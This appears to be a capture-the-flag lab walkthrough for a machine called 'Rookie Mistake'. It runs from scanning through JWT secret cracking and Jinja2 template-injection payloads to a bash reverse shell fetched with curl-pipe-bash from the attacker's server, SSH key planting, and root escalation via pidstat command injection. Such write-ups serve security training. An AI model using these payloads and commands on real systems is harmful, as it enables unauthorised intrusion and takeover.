@@ -1,0 +1,188 @@
+																							                     Rookie Mistake Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.214.221
+export IP=
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+nmap -Pn -n -sC -sV -p22,8080 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy Werkzeug/2.1.2 Python/3.8.10
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+nikto --url $IP -p 80
+
+Port 8080
+Enumeration
+gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/find_me.txt -t 40
+
+/login                (Status: 308) [Size: 255] [--> http://192.168.214.221:8080/login/
+/edit                 (Status: 308) [Size: 253] [--> http://192.168.214.221:8080/edit/
+/signup               (Status: 308) [Size: 257] [--> http://192.168.214.221:8080/signup/
+
+# create a new account using the signup endpoint and check out the JWT. It's using hmac signature, so let's try to crack it.
+
+nano hash.txt
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVycyIsInB1YmxpY19pZCI6IjYxYWU0ODQxLWFhMDEtNDI5Ny1iMGNmLWQ2MmQ5ODkyODJjYyIsImV4cCI6MTY4MTk5MDcwNn0.eoPprQTXnwG_NvFmPViSycWZTK4J0V1TVvowhVTPBGw
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+ilovejwt 
+
+# Now that we have the JWT secret, let's see any of the JWT claims are vulnerable to injection
+
+{
+  "username": "{{7*7}}",
+  "public_id": "9071940f-6d9f-4503-b3b0-43f0b2fa015f",
+  "exp": 1681997420
+}
+
+VERIFY SIGNATURE
+ilovejwt
+
+# Place the jwt in browser and access the page http://192.168.214.221:8080/edit/, let's see it it's getting executed.
+   Aparently, it does, we get the result 49.
+   
+   
+
+# When we first visited the web app, we noticed that the app is using flask.
+
+ I have learned a lot about python, flask and JWTs 
+ 
+# When Flask is used,  Jinja2 is the default templating engine, so it's likely that it will be used in most Flask applications.
+   Searching online, we find https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#jinja-injection-without-less-than-class-object-greater-than.
+   So, let's see if we are lucky.
+   
+We find multiple payloads, let's chose the first one
+
+# RCE
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
+{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
+{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
+
+# Use the secret ilovejwt and modify the username claim and navigate to the page  http://192.168.214.221:8080/edit/ or hit refresh on it. Make sure you replace double quotes with a single quote.
+
+{
+  "username": "{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('ls').read() }}",
+  "public_id": "17a9d421-86b8-4c7e-877d-e6fdd0d96971",
+  "exp": 1682013275
+}
+
+# We get the following error. So it does work, but we can't execute commands directly, but let's try to use a shell from our own server.
+
+Changing password for: app.py Database.db templates
+
+# Let's create our shell payload and open a python server from which we download it and hopefully executing it.
+
+nano exploit.sh
+#!/bin/bash
+bash -c ‘bash -i >& /dev/tcp/192.168.45.5/4444 0>&1’
+
+python3 -m http.server 80
+
+# Now, modify our payload and use curl to get the bash file.
+
+{
+  "username": "{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('curl 192.168.45.5/exploit.sh | bash').read() }}",
+  "public_id": "17a9d421-86b8-4c7e-877d-e6fdd0d96971",
+  "exp": 1682013275
+}
+
+# Have a netcat listener opened and refresh the edit page. Got shell.
+
+nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.172.221] 41530
+
+cat /home/mike/local.txt                                                 # Flag: c79a3a12bd309fc6e8433bb765fb80b3
+
+
+
+Privilege escalation
+
+
+# Let's get a proper shell, let's use our own ssh keys and transfer them byu creatking a new .ssh dir into mike's folder
+
+Get our keys ready
+
+cp /root/.ssh/id_rsa.pub /home/kali/authorized_keys
+
+python3 -m http.server 80
+
+# Grab the keys and place them on the victim's machine
+
+mkdir /home/mike/.ssh
+cd .ssh
+wget 192.168.45.5/authorized_keys
+chmod 600 authorized_keys
+
+# Now login into SSH with your private key
+
+ssh -i /root/.ssh/id_rsa mike@$IP
+
+sudo -l
+(ALL) NOPASSWD: /usr/local/bin/PidMonitorServer
+
+# Let's start the server and see what's going on
+
+sudo /usr/local/bin/PidMonitorServer
+Access Mike's own process monitor server started at port 9123!
+
+# Ok, let's try to see what's on the server. We've tried a nmap scap to see if the server is available on the network but it's not. So, i guess it's a local server. Let's verify.
+
+netstat -tunlp
+tcp        0      0 127.0.0.1:9123          0.0.0.0:*               LISTEN      - 
+
+# Ok let's do a simple curl and see what's going on.
+
+curl http://127.0.0.1:9123
+<h1>Welcome to my PID status monitor. You can specify the PID in the URL '/pid/*'!
+
+curl http://127.0.0.1:9123/pid/12
+<h1>Getting status of PID: 12...</h1>
+
+
+b'Linux 5.4.0-121-generic (MikeServer) \t04/20/2023 \t_x86_64_\t(2 CPU)\n\n06:21:38 PM   UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command\n06:21:38 PM     0        12    0.00    0.00    0.00    0.00    0.00     0  migration/0\n'
+
+# Good, let's try to provide an invalid input to see maybe we get a help message or something.
+
+curl http://127.0.0.1:9123/pid/ee
+<h1>Getting status of PID: ee...</h1>
+
+
+b'Usage: pidstat [ options ] [ <interval> [ <count> ] ] [ -e <program> <args> ]\nOptions are:\n[ -d ] [ -H ] [ -h ] [ -I ] [ -l ] [ -R ] [ -r ] [ -s ] [ -t ] [ -U [ <username> ] ]\n[ -u ] [ -V ] [ -v ] [ -w ] [ -C <command> ] [ -G <process_name> ]\n[ -p { <pid> [,...] | SELF | ALL } ] [ -T { TASK | CHILD | ALL } ]\n[ --dec={ 0 | 1 | 2 } ] [ --human ]\n'
+
+# Alright, aparently it's using the pidstat command. Let's search on gtfobins. ./pidstat -e $COMMAND
+   Let's see where is the root directory of the server. We will use the ls command.
+
+curl http://127.0.0.1:9123/pid/1%20-e%20ls
+s\napp\nlocal.txt\ntodo.txt\n'
+
+# Aparently, we are in the home directory of user Mike. So, let's create a bash script in Mike's home directory which will contain a reverse shell.
+
+cd /home/Mike
+nano exploit.sh
+#!/bin/bash
+bash -c ‘bash -i >& /dev/tcp/192.168.45.5/4444 0>&1’
+
+# Now, let's call the script while having a netcat listener opened.
+
+nc -lvnp 4444
+
+curl http://127.0.0.1:9123/pid/1 -e bash exploit.sh 
+curl http://127.0.0.1:9123/pid/1%20-e%20bash%20exploit.sh 
+
+Got root shell!
+
+cat /root/proof.txt                                                # Flag: 6e43fbd94debd774e69301738add9943
